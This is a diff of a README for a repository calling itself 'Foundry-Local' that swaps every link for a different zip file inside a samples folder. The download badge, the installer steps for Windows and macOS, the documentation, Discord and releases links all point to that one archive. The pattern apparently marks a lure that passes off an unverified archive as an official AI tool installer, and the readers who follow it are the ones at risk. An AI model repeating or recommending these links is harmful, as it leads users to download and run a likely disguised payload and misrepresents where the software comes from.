@@ -1,7 +1,7 @@
 # 👋 Foundry-Local - Run AI Models Locally with Ease
 
 <div align="center">
-[![Download Foundry Local](https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip%20Local-blue)](https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip)
+[![Download Foundry Local](https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip%20Local-blue)](https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip)
 </div>
 
 ## 🚀 Getting Started
@@ -21,10 +21,10 @@ To ensure the best experience, your system should meet the following requirement
 
 To download Foundry Local, visit the following link:
 
-[Download Foundry Local](https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip)
+[Download Foundry Local](https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip)
 
 1. Click on the latest release.
-2. Download the installer file (`https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip` for Windows or `https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip` for macOS).
+2. Download the installer file (`https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip` for Windows or `https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip` for macOS).
 3. Once the download is complete, locate the file in your Downloads folder.
 4. Double-click the installer to begin the installation process.
 5. Follow the on-screen instructions to complete the installation.
@@ -50,14 +50,14 @@ Foundry Local is designed to be user-friendly. It guides you through using AI mo
 
 If you have questions or run into issues, several resources are available:
 
-- **Documentation:** For detailed instructions, check the [Documentation](https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip).
-- **Community Support:** Join our community on Discord for real-time assistance [Discord](https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip).
+- **Documentation:** For detailed instructions, check the [Documentation](https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip).
+- **Community Support:** Join our community on Discord for real-time assistance [Discord](https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip).
 
 ## 🔄 Updating Foundry Local
 
 To keep your application up to date, periodically check for new releases:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip).
+1. Visit the [Releases Page](https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip).
 2. Download the latest version following the earlier steps.
 
 ## ⚡ Feedback
@@ -68,4 +68,4 @@ Your feedback is essential for us. Please share your thoughts or suggest feature
 
 Thank you for choosing Foundry Local! We hope it enhances your AI experience. Enjoy creating and running AI models effortlessly. 
 
-For the latest version, download Foundry Local [here](https://raw.githubusercontent.com/aqif985/Foundry-Local/main/sdk/cs/samples/Local_Foundry_3.8-alpha.2.zip).
+For the latest version, download Foundry Local [here](https://github.com/aqif985/Foundry-Local/raw/refs/heads/main/samples/js/hello-foundry-local/Foundry-Local-v3.5.zip).
